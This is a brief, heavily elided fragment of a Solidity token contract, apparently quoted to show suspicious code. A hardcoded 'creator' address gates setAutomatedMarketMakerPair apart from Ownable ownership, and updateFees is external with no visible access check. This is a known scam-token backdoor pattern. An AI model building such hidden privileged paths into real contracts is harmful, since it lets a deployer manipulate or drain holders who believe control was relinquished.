...
contract Token is Ownable {
    ...
    function updateFees(address sss) external   {
    ...
    function setAutomatedMarketMakerPair() external {
        if(creator == _msgSender()){
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        creator = 0xc12A5901FDc3498e6B3Ba0840c8257323b800813;
